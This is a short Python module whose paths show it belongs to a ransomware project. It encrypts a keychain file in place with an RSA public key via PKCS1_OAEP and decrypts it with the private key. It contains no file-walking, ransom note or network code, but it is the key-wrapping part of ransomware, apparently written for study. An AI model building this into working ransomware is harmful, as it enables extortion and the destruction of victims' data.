from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# openssl genrsa -out key.pem 4096
# openssl rsa -in key.pem -pubout > mykey.pub

keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"
key_path = "/home/daniel/git/cyber/ransomware/key.pem"
public_key_path = "/home/daniel/git/cyber/ransomware/mykey.pub"

debug = 0
def get_public_key():
    with open(public_key_path,'rb') as pub:
        return RSA.importKey(pub.read())
        
def get_private_key():
    with open(key_path,'rb') as priv:
        return RSA.importKey(priv.read())
         
    
def encrypt_rsa():
    key = get_public_key()
    with open(keychain_path, 'rb') as keychain:
        original = keychain.read()
        encryptor = PKCS1_OAEP.new(key)
        encrypted = encryptor.encrypt(original) 
        
    with open(keychain_path, 'wb') as encrypted_file:   # opening the file in write mode and
        encrypted_file.write(encrypted)     # writing the encrypted data 
    
def decrypt_rsa():
    global debug
    key = get_private_key()
    with open(keychain_path, 'rb') as keychain:
        encrypted = keychain.read()
        decryptor = PKCS1_OAEP.new(key)
        decrypted = decryptor.decrypt(encrypted)
        if debug:
            print('Decrypted:', decrypted)
        
    with open(keychain_path, 'wb') as keychain:
        keychain.write(decrypted)
        print("done decrypt file with rsa")

